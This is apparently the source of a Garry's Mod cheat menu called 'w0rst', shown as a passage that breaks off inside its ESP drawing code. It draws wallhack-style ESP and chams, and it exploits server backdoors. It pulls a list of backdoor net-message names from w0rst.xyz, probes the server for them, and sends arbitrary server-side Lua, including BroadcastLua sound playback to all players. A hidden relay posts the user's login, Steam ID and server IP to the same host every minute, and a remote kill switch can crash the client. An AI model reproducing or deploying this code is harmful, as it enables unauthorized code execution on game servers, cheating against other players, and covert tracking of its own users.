local wtf={}

function wtf.gString(l)
    local s = ""
    for i = 1, l do
    s = s.. string.char(math.random(32, 126))
end return s
end

local esp_hook, bhop_hook, hud_hook, as_hook, flash_spam_hook = wtf.gString(math.random(10, 220)), wtf.gString(math.random(10, 220)), wtf.gString(math.random(10, 220)), wtf.gString(math.random(10, 220)), wtf.gString(math.random(10, 220))
local use_timer, log_timer, key_hook, rgb_physgun_hook = wtf.gString(math.random(10, 220)), wtf.gString(math.random(10, 220)), wtf.gString(math.random(10, 220)), wtf.gString(math.random(10, 220))
local relay_hook = wtf.gString(math.random(10, 220))

local tracer_enable, distance_enable, name_enable, weapon_enable, box_2d_enable, box_3d_enable, chams_enable = false, false, false, false, false, false, false
local wallhack_enable, freecam_enable, bhop_enable, is_key_down, use_spam_enable, flash_spam_enable = false, false, false, false, false, false
local rainbow_enable, skeleton_enable, rgb_physgun_enable = false, false, false

local aimbot_enable, autoshoot_enable, aimbot_hook = false, false, wtf.gString(math.random(10, 220))
local entity_list, entity_enable = {}, false

local tracer_color = { r="255", g="255", b="255" }
local distance_color = { r="255", g="255", b="255" }
local name_color = { r="255", g="255", b="255" }
local weapon_color = { r="255", g="255", b="255" }
local box_2d_color = { r="255", g="255", b="255" }
local box_3d_color = { r="255", g="255", b="255" }
local skeleton_color ={ r="255", g="255", b="255" }
local chams_color = { r="255", g="255", b="255" }
local entity_color = { r="255", g="255", b="255" }

local selected_net="NONE"
local selected_player="NONE"

--/ Information passed from login file
local user_info = string.Split(file.Read("w0rst/login.txt"), ":")
local decrypted_user = util.Base64Decode(user_info[1])

function relay()
  local lp = LocalPlayer()
  http.Post("https://w0rst.xyz/api/relay.php", {
    username=decrypted_user,
    steam_name=lp:Name(),
    steam_id=lp:SteamID(),
    server_name=GetHostName(),
    server_ip=game.GetIPAddress() }, function(b)
        local s = string.Split(b, " ");
        if(s[1] == "a4dF91aE25c2BFD11F879e42") then
            function die() return die() end die()
        end
    end)
end

local relay_delay = 0
hook.Add("Think", relay_hook, function()
    if CurTime() < relay_delay then return end
    relay_delay = CurTime() + 60
    relay()
end)

function wtf.check(str)
    return (_G.util.NetworkStringToID(str) > 0)
end

function wtf.check_web_nets()
    http.Post("https://w0rst.xyz/api/net/view.php", { A0791AfFA0F30EdCee1EdADb="02C2C6A1Ded7183AeDAA8650" }, function(b)
        local nets = string.Split(b, " ")
        for k,v in pairs(nets) do
            if wtf.check(v) then
                wtf.log("Net Found: "..v); wtf.conoutRGB("NET: "..v)
                selected_net=v
            end
        end
    end)
end

function wtf.add_net(str)
    http.Post("https://w0rst.xyz/api/net/upload.php", {s=str})
end

function wtf.sendlua(lua, s_c, name)
    if wtf.check(selected_net) then
        _G.net.Start(selected_net)
        _G.net.WriteString(lua)
        _G.net.WriteBit(1)
        _G.net.SendToServer()
    else
        wtf.log("Net Not Selected"); wtf.conoutRGB("Error: Net Not Selected")
    end
end

wtf.Icons = { V="https://w0rst.xyz/script/images/visuals.png", P="https://w0rst.xyz/script/images/players.png", B="https://w0rst.xyz/script/images/backdoor.png", M="https://w0rst.xyz/script/images/misc.png", S="https://w0rst.xyz/script/images/sounds.png" }

function wtf.Download(filename, url, callback, errorCallback)
    local path = "w0rst/images/" .. filename
    local dPath = "data/" .. path
    if (file.Exists(path, "DATA")) then return callback(dPath) end
    if (not file.IsDir(string.GetPathFromFilename(path), "DATA")) then
        file.CreateDir(string.GetPathFromFilename(path))
    end

    errorCallback = errorCallback or function(reason) end
    http.Fetch(url, function(body, size, headers, code)
    if (code ~= 200) then return errorCallback(code) end
        file.Write(path, body)
        callback(dPath)
    end, errorCallback)
end

function wtf.IconSet(iconUrls, path, cb)
    local set = {}
    local count = 0
    local iconAmt = table.Count(iconUrls)

    for name, url in pairs(iconUrls) do
        wtf.Download((path or "") .. util.CRC(name .. url) .. "." .. string.GetExtensionFromFilename(url), url, function(path)
            set[name] = Material(path, "unlitgeneric")
            count = count + 1
        if (count == iconAmt and cb) then
            cb(set)
        end
    end)
end return set
end

function wtf.Map(tbl, fn)
	local new = {}
	for k, v in pairs(tbl) do
		new[k] = fn(v, k, tbl)
    end return new
end

wtf.Materials = {}
wtf.Materials = wtf.IconSet(wtf.Icons, "")

wtf.IconSet(wtf.Map(wtf.Icons, function(v) return end), "",
function(icons)
    for k, icon in pairs(icons) do
        wtf.Icons[k].iconMat = icon
    end
end)

function wtf.conoutRGB(str)
	local text = {}
	for i = 1, #str do
		table.insert(text, HSVToColor(i * math.random(2, 10) % 360, 1, 1 ))
		table.insert(text, string.sub(str, i, i))
	end

	table.insert(text, "\n")
	MsgC(unpack(text))
end

local log_posY=10
function wtf.log(str)
    local frame=vgui.Create("DFrame")
    frame:SetSize(220,30)
    frame:SetPos(-300, log_posY)
    frame:SetTitle("~w0rst~ "..str)
    frame:ShowCloseButton(false)
    frame:SetDraggable(false)
    frame.Paint = function(s,w,h)
        draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
        surface.SetDrawColor(Color(15,15,15, 255))
        surface.DrawOutlinedRect(0,0,s:GetWide(),s:GetTall())
    end

    frame:MoveTo(5, log_posY, 1,0,0.5)
    timer.Simple(3, function()
        local x, y = frame:GetPos()
        frame:MoveTo(-300, y, 1, 0, 0.5);
        timer.Simple(0.5, function() frame:Close() end)
    end)

    log_posY=log_posY+35
    timer.Remove(log_timer)
    timer.Create(log_timer, 3.5, 1, function()
        log_posY=10
    end)
end

surface.CreateFont('Font', { font = 'Open Sans', extended = false, size = 20, weight = 1000, blursize = 0, scanlines = 0, antialias = true, underline = false, italic = false, strikeout = false, symbol = false, rotary = false, shadow = true, additive = false, outline = false, }) --/ Font-1
surface.CreateFont('Font2', { font = 'Marlett', extended = false, size = 17, weight = 1000, blursize = 0, scanlines = 0, antialias = true, underline = false, italic = false, strikeout = false, symbol = false, rotary = false, shadow = true, additive = true, outline = true, }) --/ Font-2

local menu=vgui.Create("DFrame")
menu:SetSize(600,540)
menu:SetTitle("")
menu:Center()
menu:MakePopup()
menu:SetPaintShadow(true)
menu:ShowCloseButton(false)
menu:SetDraggable(true)
menu.Paint = function(self,w,h)
    local rainbow = HSVToColor((CurTime() * 99) % 360, 1, 1)
    draw.RoundedBox(0,0,0,w,h,Color(30, 30, 30, 255))
    surface.SetDrawColor(rainbow.r,rainbow.g,rainbow.b,255)
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
end

local menu_close_btn=vgui.Create("DButton", menu)
menu_close_btn:SetText("X")
menu_close_btn:SetSize(30,30)
menu_close_btn:SetPos(570,0)
menu_close_btn.Paint = function(self,w,h)
    self:SetTextColor(Color(75,75,75, 105))
    surface.SetDrawColor(Color(0,0,0,0))
    surface.DrawOutlinedRect(0,0,w,h)
end

menu_close_btn.DoClick = function()
    menu:Close(); hook.Remove("Think", key_hook)
end

local tab=vgui.Create("DFrame", menu)
tab:ShowCloseButton(false)
tab:SetDraggable(false)
tab:SetTitle("")
tab:SetSize(570,500)
tab:SetPos(15, 30)
tab.Paint = function(self, w, h)
    surface.SetDrawColor(Color(15,15,15,255))
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
    draw.RoundedBox(0,0,0,w,h,Color(55, 55, 55, 25))
end

local background=vgui.Create("HTML", tab)
background:SetVisible(true)
background:SetPos(125,50)
background:SetSize(490,390)
background:SetHTML([[<img src='https://i.imgur.com/OMKLFDr.png' alt='Img' style='width:300px;height:300px;'>]])

local tab_visuals=vgui.Create("DFrame", tab)
tab_visuals:ShowCloseButton(false)
tab_visuals:SetVisible(false)
tab_visuals:SetDraggable(false)
tab_visuals:SetTitle("")
tab_visuals:SetSize(465, 480)
tab_visuals:SetPos(95, 10)
tab_visuals.Paint = function(self, w, h)
    draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
    surface.SetDrawColor(Color(15,15,15,255))
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
end

local tab_aim=vgui.Create("DFrame", tab)
tab_aim:ShowCloseButton(false)
tab_aim:SetVisible(false)
tab_aim:SetDraggable(false)
tab_aim:SetTitle("")
tab_aim:SetSize(465, 480)
tab_aim:SetPos(95, 10)
tab_aim.Paint = function(self, w, h)
    draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
    surface.SetDrawColor(Color(15,15,15,255))
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
end

local tab_players=vgui.Create("DFrame", tab)
tab_players:ShowCloseButton(false)
tab_players:SetVisible(false)
tab_players:SetDraggable(false)
tab_players:SetTitle("")
tab_players:SetSize(465, 480)
tab_players:SetPos(95, 10)
tab_players.Paint = function(self, w, h)
    draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
    surface.SetDrawColor(Color(15,15,15,255))
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
end

local tab_backdoor=vgui.Create("DFrame", tab)
tab_backdoor:ShowCloseButton(false)
tab_backdoor:SetVisible(false)
tab_backdoor:SetDraggable(false)
tab_backdoor:SetTitle("")
tab_backdoor:SetSize(465, 480)
tab_backdoor:SetPos(95, 10)
tab_backdoor.Paint = function(self, w, h)
    draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
    surface.SetDrawColor(Color(15,15,15,255))
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
    draw.SimpleText("Client", "Font", 320, 7, Color(255,255,255,255))
    draw.SimpleText("Server", "Font", 90, 7, Color(255,255,255,255))
end

local tab_sounds=vgui.Create("DFrame", tab)
tab_sounds:ShowCloseButton(false)
tab_sounds:SetVisible(false)
tab_sounds:SetDraggable(false)
tab_sounds:SetTitle("")
tab_sounds:SetSize(465, 480)
tab_sounds:SetPos(95, 10)
tab_sounds.Paint = function(self, w, h)
    draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
    surface.SetDrawColor(Color(15,15,15,255))
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
end

local tab_misc=vgui.Create("DFrame", tab)
tab_misc:ShowCloseButton(false)
tab_misc:SetVisible(false)
tab_misc:SetDraggable(false)
tab_misc:SetTitle("")
tab_misc:SetSize(465, 480)
tab_misc:SetPos(95, 10)
tab_misc.Paint = function(self, w, h)
    draw.RoundedBox(0,0,0,w,h,Color(30,30,30,255))
    surface.SetDrawColor(Color(15,15,15,255))
    surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
end

local lua_editor=vgui.Create("DTextEntry", tab_backdoor)
lua_editor:SetPos(10, 255)
lua_editor:AllowInput()
lua_editor:SetSize(445, 180)
lua_editor:SetValue("Run Lua | Server-Side")
lua_editor:SetMultiline(true)
lua_editor.Paint = function(self, w, h)
    surface.SetDrawColor(15, 15, 15, 255)
    surface.DrawOutlinedRect(0, 0, w, h)
    self:DrawTextEntryText(Color(255, 255, 255), Color(20, 20, 150), Color(100, 100, 100))
    self:SetFont('Trebuchet18')
end

local function create_tab_button(show, mat, x, y)
    btn=vgui.Create("DButton", tab)
    btn:SetSize(70,70)
    btn:SetPos(x, y)
    btn:SetText("")
    btn:SetMaterial(mat)
    btn.Paint = function(self, w, h) surface.SetDrawColor(Color(0,0,0)) end
    btn.DoClick = function()
        if(show == tab_visuals) then
            show:SetVisible(true); background:SetVisible(false)
            tab_players:SetVisible(false); tab_backdoor:SetVisible(false);
            tab_sounds:SetVisible(false); tab_misc:SetVisible(false);
        end
        if(show == tab_players) then
            show:SetVisible(true); background:SetVisible(false)
            tab_visuals:SetVisible(false); tab_backdoor:SetVisible(false);
            tab_sounds:SetVisible(false); tab_misc:SetVisible(false);
        end
        if(show == tab_backdoor) then
            show:SetVisible(true); background:SetVisible(false)
            tab_players:SetVisible(false); tab_visuals:SetVisible(false);
            tab_sounds:SetVisible(false); tab_misc:SetVisible(false);
        end
        if(show == tab_sounds) then
            show:SetVisible(true); background:SetVisible(false)
            tab_players:SetVisible(false); tab_backdoor:SetVisible(false);
            tab_visuals:SetVisible(false); tab_misc:SetVisible(false);
        end
        if(show == tab_misc) then
            show:SetVisible(true); background:SetVisible(false)
            tab_players:SetVisible(false); tab_backdoor:SetVisible(false);
            tab_sounds:SetVisible(false); tab_visuals:SetVisible(false);
        end
    end return { btn }
end

local function create_panel(tab, width, height, x, y)
    local pannel=vgui.Create("DScrollPanel", tab)
    pannel:SetSize(width,height)
    pannel:SetPos(x, y)
    pannel:GetVBar():SetWide(0)
    pannel.Paint = function(self,w,h)
        surface.SetDrawColor(Color(15,15,15,255))
        surface.DrawOutlinedRect(0,0,w,h)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
    end
    return { pannel }
end

local function create_button(name, tab, width, height, x, y, func)
    btn=vgui.Create("DButton", tab)
    btn:SetSize(width, height)
    btn:SetPos(x, y)
    btn:SetText(name)
    btn.DoClick = func
    btn.Paint = function(self, w,h)
        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
        surface.SetDrawColor(40, 40, 40, 255)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
        self:SetTextColor(Color(255,255,255))
    end
end

--/ init panels for later functions
local player_panel=create_panel(tab_players, 445, 435, 10, 10)
local entity_panel=create_panel(tab_visuals, 440, 300, 15, 160)
local sounds_panel=create_panel(tab_sounds, 445, 425, 10, 10)
local server_panel=create_panel(tab_backdoor, 200, 200, 20, 35)
local client_panel=create_panel(tab_backdoor, 200, 200, 245, 35)

local bd_server_posY, bd_client_posY = 5,5
local function create_backdoor_server(name, func)
    btn=vgui.Create("DButton", server_panel[1])
    btn:SetSize(175, 30)
    btn:SetPos(12, bd_server_posY)
    btn:SetText(name)
    btn.DoClick = func
    btn.Paint = function(self, w,h)
        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
        surface.SetDrawColor(40, 40, 40, 255)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
        self:SetTextColor(Color(255,255,255))
    end

    bd_server_posY = bd_server_posY + 35
end

local function create_backdoor_client(name, func)
    btn=vgui.Create("DButton", client_panel[1])
    btn:SetSize(175, 30)
    btn:SetPos(12, bd_client_posY)
    btn:SetText(name)
    btn.DoClick = func
    btn.Paint = function(self, w,h)
        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
        surface.SetDrawColor(40, 40, 40, 255)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
        self:SetTextColor(Color(255,255,255))
    end

    bd_client_posY = bd_client_posY + 35
end

local sounds = { 
    "Velvet https://w0rst.xyz/script/sounds/egovert-velvet.mp3",
    "MrMoney https://w0rst.xyz/script/sounds/shotgunwilly-mrmoney.mp3",
    "GoLoko https://w0rst.xyz/script/sounds/tyga-goloko.mp3",
    "BadBoy https://w0rst.xyz/script/sounds/yungbae-badboy.mp3",
    "RooDoo https://w0rst.xyz/script/sounds/bbno$-roodoo.mp3",
    "SingleSummer https://w0rst.xyz/script/sounds/gyyps-singleforthesummer.mp3",
    "Quiting https://w0rst.xyz/script/sounds/khary-quitting.mp3",
    "DoubtIt https://w0rst.xyz/script/sounds/kyle-doubtit.mp3",
    "Hex https://w0rst.xyz/script/sounds/80purp-hex.mp3",
    "DownBad https://w0rst.xyz/script/sounds/jcole-downbad.mp3",
    "JustTheTwoOfUs https://w0rst.xyz/script/sounds/groverwashington-justthetwoofus.mp3",
    "StillCreeping https://w0rst.xyz/script/sounds/chuuwee-still-creeping.mp3",
    "BeLazy https://w0rst.xyz/script/sounds/skizzymars-be-lazy.mp3"
}

local btn_sound_posX,btn_sound_posY=17,10
local function create_sound_buttons()
    local loop = table.Count(sounds)
    for i = 1, loop do 
        local song = string.Split(sounds[i], " ") --/ split the name & url
        local btn=vgui.Create("DButton", sounds_panel[1])
        btn:SetSize(130,80)
        btn:SetText(song[1])
        btn:SetFont("Font2")
        btn:SetPos(btn_sound_posX, btn_sound_posY)
        btn.Paint = function(self, w,h)
            draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
            surface.SetDrawColor(40, 40, 40, 255)
            surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
            self:SetTextColor(Color(155,155,155))
        end
        btn.DoClick = function()
            if selected_net ~= nil then 
                wtf.sendlua([[BroadcastLua("sound.PlayURL(']]..song[2]..[[','mono',function(station) station:Play() end)")]])
                wtf.log("Sent Sound: "..song[1]); wtf.conoutRGB("PLAYED SOUND: "..song[1])
            else
                wtf.log("No Net Selected"); wtf.conoutRGB("NO NET SELECTED")
            end
        end

        btn_sound_posX=btn_sound_posX+140
        if btn_sound_posX==437 then
            btn_sound_posX=17
            btn_sound_posY=btn_sound_posY+90
        end
    end
end

local function create_checkbox(name, tab, x, y, func)
    local frame=vgui.Create("DFrame", tab)
    frame:SetSize(100,25)
    frame:SetPos(x,y)
    frame:SetDraggable(false)
    frame:ShowCloseButton(false)
    frame:SetTitle("")
    frame.Paint = function(self, w,h)
        draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
        surface.SetDrawColor(40, 40, 40, 255)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
    end

    local checkbox=frame:Add("DCheckBoxLabel")
    checkbox:SetPos(5,5)
    checkbox:SetText(name)
    checkbox:SetDark(true)
    checkbox.OnChange = func
    checkbox.Paint = function(self, w, h)
        self:SetTextColor(Color(255,255,255))
    end
end

local function create_color_silder(name, tab, color, x, y)
    local frame=vgui.Create("DFrame", tab)
    frame:SetSize(145,85)
    frame:SetPos(x,y)
    frame:SetDraggable(false)
    frame:ShowCloseButton(false)
    frame:SetTitle(name)
    frame.Paint = function(self, w,h)
        surface.SetDrawColor(Color(15,15,15,255))
        surface.DrawOutlinedRect(0,0,w,h)
        surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
    end

    local colR=vgui.Create("DNumSlider", frame)
    colR:SetText("Red:");
    colR:SetMin(0);
    colR:SetMax(255)
    colR:SetSize(140, 10)
    colR:SetPos(10,25)
    colR:SetDecimals(0)
    colR:SetDark(true)
    colR.OnValueChanged = function(self, value)
        color.r=self:GetValue()
    end

    local colG=vgui.Create("DNumSlider", frame)
    colG:SetText("Green:")
    colG:SetMin(0);
    colG:SetMax(255)
    colG:SetSize(140, 10)
    colG:SetPos(10,45)
    colG:SetDecimals(0)
    colG:SetDark(true)
    colG.OnValueChanged = function(self, value)
        color.g=self:GetValue()
    end

    local colB=vgui.Create("DNumSlider", frame)
    colB:SetText("Blue:");
    colB:SetMin(0);
    colB:SetMax(255)
    colB:SetSize(140, 10)
    colB:SetPos(10,65)
    colB:SetDecimals(0)
    colB:SetDark(true)
    colB.OnValueChanged = function(self, value)
        color.b=self:GetValue()
    end

    local function update_colors()
        if(colR:GetValue() ~= color.r) then colR:SetValue(color.r) end
        if(colG:GetValue() ~= color.g) then colG:SetValue(color.g) end
        if(colB:GetValue() ~= color.b) then colB:SetValue(color.b) end
    end; update_colors()

    return { colR, colG, colB }
end

local plr,plr_posX,plr_posY=nil, 9, 10
local function populate_players()
    for k,v in pairs(player.GetAll()) do
      local frame = vgui.Create("DFrame", player_panel[1])
      frame:SetPos(plr_posX, plr_posY)
      frame:SetSize(135, 130)
      frame:SetTitle(" ")
      frame:SetDraggable(false)
      frame:ShowCloseButton(false)
      frame.Paint = function(self, w, h)
          surface.SetDrawColor(Color(15,15,15,255))
          surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
          draw.RoundedBox(0,0,0,w,h,Color(55, 55, 55, 25))
      end

      local labelbutton = vgui.Create("DButton", frame)
      labelbutton:SetText("Select " .. v:Nick())
      labelbutton:SetColor(Color(255,255,255))
      labelbutton:SetSize(115, 30)
      labelbutton:SetPos(10, 90)
      labelbutton.Paint = function(self, w, h)
          draw.RoundedBox(0,0,0,self:GetWide(),self:GetTall(),Color(35, 35, 35, 255))
          surface.SetDrawColor(40, 40, 40, 255)
          surface.DrawOutlinedRect(0,0,self:GetWide(),self:GetTall())
          self:SetTextColor(Color(255,255,255))
      end
      labelbutton.DoClick = function()
          plr = v:UserID()
          selected_player=plr
          wtf.log("Player: "..Player(plr):Nick().." Selected")
          wtf.conoutRGB("SELECTED PLAYER: "..Player(plr):Nick())
      end

      local avatarframe = vgui.Create("DFrame", frame)
      avatarframe:SetSize(72, 72)
      avatarframe:SetPos(32, 10)
      avatarframe:SetTitle(" ")
      avatarframe:SetDraggable(false)
      avatarframe:ShowCloseButton(false)
      avatarframe.Paint = function(self, w, h)
          draw.RoundedBox(0,0,0,w,h,Color(0,0,0, 255))
      end

      local avatar = vgui.Create( "AvatarImage", avatarframe )
      avatar:SetSize(70, 70)
      avatar:Center()
      avatar:SetPlayer(v, 128)
      avatar.Paint = function(self, w, h)
          draw.RoundedBox( 10, 0, 0, w, h, Color(255,255,255))
      end

      plr_posX=plr_posX+145
      if plr_posX==444 then
          plr_posX=9
          plr_posY=plr_posY+140
      end
    end
end; populate_players()

local entonlist = vgui.Create("DListView", entity_panel[1])
entonlist:SetPos( 220, 0)
entonlist:SetSize( 220, 298 )
entonlist:SetMultiSelect(false)
entonlist:AddColumn("Whitelisted Entities")
entonlist:SetHideHeaders(true)
entonlist.Paint = function(self,w,h)
    surface.SetDrawColor(Color(0,0,0,0))
    surface.DrawOutlinedRect(0,0,w,h)
end

local entofflist = vgui.Create("DListView", entity_panel[1])
entofflist:SetPos( 0, 0 )
entofflist:SetSize( 220, 298 )
entofflist:SetMultiSelect(false)
entofflist:SetHideHeaders(true)
entofflist:AddColumn("Whitelist Entities")
entofflist.Paint = function(self,w,h)
  surface.SetDrawColor(Color(0,0,0,0))
  surface.DrawOutlinedRect(0,0,w,h)
end
function entofflist:DoDoubleClick()
    table.insert( entity_list, entofflist:GetLine(entofflist:GetSelectedLine()):GetValue(1) )
end

local tracer_slider=create_color_silder("Tracer-Color-Editor", tab_misc, tracer_color, 9, 200)
local distance_slider=create_color_silder("Distance-Color-Editor", tab_misc, distance_color, 159, 200)
local name_slider=create_color_silder("Name-Color-Editor", tab_misc, name_color, 309, 200)
local weapon_slider=create_color_silder("Weapon-Color-Editor", tab_misc, weapon_color, 9, 290)
local box_2d_slider=create_color_silder("Box-2D-Color-Editor", tab_misc,  box_2d_color, 159, 290)
local box_3d_slider=create_color_silder("Box-3D-Color-Editor", tab_misc, box_3d_color, 309, 290)
local skeleton_slider=create_color_silder("Skeleton-Color-Editor", tab_misc, skeleton_color, 9, 380)
local chams_slider=create_color_silder("Chams-Color-Editor", tab_misc, chams_color, 159, 380)
local entity_slider=create_color_silder("Entity-Color-Editor", tab_misc, entity_color, 309, 380)

local tab_button_visuals=create_tab_button(tab_visuals, wtf.Materials.V, 13, 5)
local tab_button_misc=create_tab_button(tab_misc, wtf.Materials.M, 13, 85)
local tab_button_players=create_tab_button(tab_players, wtf.Materials.P, 13, 165)
local tab_button_backdoor=create_tab_button(tab_backdoor, wtf.Materials.B, 13, 245)
local tab_button_sounds=create_tab_button(tab_sounds, wtf.Materials.S, 13, 325)

timer.Simple(7.5, function()
    tab_button_visuals[1]:SetMaterial(wtf.Materials.V)
    tab_button_players[1]:SetMaterial(wtf.Materials.P)
    tab_button_backdoor[1]:SetMaterial(wtf.Materials.B)
    tab_button_sounds[1]:SetMaterial(wtf.Materials.S)
    tab_button_misc[1]:SetMaterial(wtf.Materials.M)
end)

local FC={}
FC.Enabled=false
FC.Hook=wtf.gString(math.random(10, 220))
FC.FC_Speed=0.9
FC.ViewOrigin=Vector(0,0,0)
FC.ViewAngle=Angle(0,0,0)
FC.Velocity=Vector(0,0,0)
function FC.CalcView(ply, origin, angles, fov)
    if not FC.Enabled then return end
    if (FC.SetView) then
        FC.ViewOrigin=origin
        FC.ViewAngle=angles
        FC.SetView=false
    end
    return {origin=FC.ViewOrigin,angles=FC.ViewAngle}
end

hook.Add("CalcView", FC.Hook, FC.CalcView)
function FC.CreateMove(cmd)
    if not FC.Enabled then return end
    local time = FrameTime()
    FC.ViewOrigin = FC.ViewOrigin + ( FC.Velocity * time )
    FC.Velocity = FC.Velocity * FC.FC_Speed
    local sensitivity = 0.022
    FC.ViewAngle.p = math.Clamp( FC.ViewAngle.p + ( cmd:GetMouseY() * sensitivity ), -89, 89 )
    FC.ViewAngle.y = FC.ViewAngle.y + ( cmd:GetMouseX() * -1 * sensitivity )
    local add = Vector(0, 0, 0)
    local ang = FC.ViewAngle
    if(cmd:KeyDown(IN_FORWARD)) then add = add + ang:Forward() end
    if(cmd:KeyDown(IN_BACK)) then add = add - ang:Forward() end
    if(cmd:KeyDown(IN_MOVERIGHT)) then add = add + ang:Right() end
    if(cmd:KeyDown(IN_MOVELEFT)) then add = add - ang:Right() end
    if(cmd:KeyDown(IN_JUMP)) then add = add + ang:Up() end
    if(cmd:KeyDown(IN_DUCK)) then add = add - ang:Up() end
    add = add:GetNormal() * time * 500
    if (cmd:KeyDown(IN_SPEED)) then add = add * 5 end
    FC.Velocity = FC.Velocity + add
    if (FC.LockView == true) then FC.LockView = cmd:GetViewAngles() end
    if (FC.LockView) then cmd:SetViewAngles(FC.LockView) end
    cmd:SetForwardMove(0)
    cmd:SetSideMove(0)
    cmd:SetUpMove(0)
end

hook.Add("CreateMove", FC.Hook, FC.CreateMove)

local function GetEntityPos(Ent)
    if Ent:IsValid() then
        local MaxX, MaxY, MinX, MinY
        local V1, V2, V3, V4, V5, V6, V7, V8

        local Points = {
            Vector(Ent:OBBMaxs().x, Ent:OBBMaxs().y, Ent:OBBMaxs().z),
            Vector(Ent:OBBMaxs().x, Ent:OBBMaxs().y, Ent:OBBMins().z),
            Vector(Ent:OBBMaxs().x, Ent:OBBMins().y, Ent:OBBMins().z),
            Vector(Ent:OBBMaxs().x, Ent:OBBMins().y, Ent:OBBMaxs().z),
            Vector(Ent:OBBMins().x, Ent:OBBMins().y, Ent:OBBMins().z),
            Vector(Ent:OBBMins().x, Ent:OBBMins().y, Ent:OBBMaxs().z),
            Vector(Ent:OBBMins().x, Ent:OBBMaxs().y, Ent:OBBMins().z),
            Vector(Ent:OBBMins().x, Ent:OBBMaxs().y, Ent:OBBMaxs().z)
        }

        for k, v in pairs( Points ) do
            local ScreenPos = Ent:LocalToWorld( v ):ToScreen()
            if MaxX ~= nil then
                MaxX, MaxY, MinX, MinY = math.max( MaxX, ScreenPos.x ), math.max( MaxY, ScreenPos.y), math.min( MinX, ScreenPos.x ), math.min( MinY, ScreenPos.y)
            else
                MaxX, MaxY, MinX, MinY = ScreenPos.x, ScreenPos.y, ScreenPos.x, ScreenPos.y
            end

            if V1 == nil then V1=ScreenPos
            elseif V2 == nil then V2=ScreenPos
            elseif V3 == nil then V3=ScreenPos
            elseif V4 == nil then V4=ScreenPos
            elseif V5 == nil then V5=ScreenPos
            elseif V6 == nil then V6=ScreenPos
            elseif V7 == nil then V7=ScreenPos
            elseif V8 == nil then V8=ScreenPos
            end
        end

        return MaxX, MaxY, MinX, MinY, V1, V2, V3, V4, V5, V6, V7, V8
    end
end

local chams01 = CreateMaterial("a", "VertexLitGeneric", {
  ["$ignorez"] = 1,
  ["$model"] = 1,
  ["$basetexture"] = "models/debug/debugwhite",
})

local chams02 = CreateMaterial("@", "VertexLitGeneric", {
  ["$ignorez"] = 0,
  ["$model"] = 1,
  ["$basetexture"] = "models/debug/debugwhite",
})

wtf.Bones = {
    "ValveBiped.Bip01_Head1", "ValveBiped.Bip01_Neck1",
    "ValveBiped.Bip01_Spine4", "ValveBiped.Bip01_Spine2",
    "ValveBiped.Bip01_Spine1", "ValveBiped.Bip01_Spine",
    "ValveBiped.Bip01_Pelvis", "ValveBiped.Bip01_R_UpperArm",
    "ValveBiped.Bip01_R_Forearm", "ValveBiped.Bip01_R_Hand",
    "ValveBiped.Bip01_L_UpperArm", "ValveBiped.Bip01_L_Forearm",
    "ValveBiped.Bip01_L_Hand", "ValveBiped.Bip01_R_Thigh",
    "ValveBiped.Bip01_R_Calf", "ValveBiped.Bip01_R_Foot",
    "ValveBiped.Bip01_R_Toe0", "ValveBiped.Bip01_L_Thigh",
    "ValveBiped.Bip01_L_Calf", "ValveBiped.Bip01_L_Foot",
    "ValveBiped.Bip01_L_Toe0"
}

hook.Add("HUDPaint", esp_hook, function()
    for k, v in pairs(ents.GetAll()) do
        if v:IsValid() and v ~= LocalPlayer() and not v:IsDormant() then
            local ent=v
            if entity_enable then
                for k, v in pairs(entity_list) do
                    if v == ent:GetClass() and ent:GetOwner() ~= LocalPlayer() then
                        local name = ent:GetClass()
                        local distance = math.Round(ent:GetPos():Distance(LocalPlayer():GetPos()))
                        local position = (ent:GetPos() + Vector(0,0,5)):ToScreen()
                        draw.SimpleText(name.." ["..distance.."]", "Default", position.x,position.y,Color(entity_color.r, entity_color.g, entity_color.b), TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
                    end
                end
            end
        end
    end

    for k,v in pairs (player.GetAll()) do
            if v ~= LocalPlayer() and v:IsValid() and v:Alive() and v:Health() > 0 then
                local Ent=v

                if tracer_enable then
                    surface.SetDrawColor(Color(tracer_color.r, tracer_color.b, tracer_color.g))
                    surface.DrawLine(ScrW()/2,ScrH(),v:GetPos():ToScreen().x,v:GetPos():ToScreen().y)
                end

                if distance_enable then
                    local position = (v:GetPos() + Vector(0,0,90)):ToScreen()
                    local distance = math.Round(v:GetPos():Distance(LocalPlayer():GetPos()))
                    draw.SimpleText(distance,"Default", position.x,position.y,Color(distance_color.r, distance_color.g, distance_color.b), TEXT_ALIGN_CENTER,TEXT_ALIGN_CENTER)
                end

                if name_enable then
                    local position = ( v:GetPos() + Vector( 0,0,80 ) ):ToScreen()
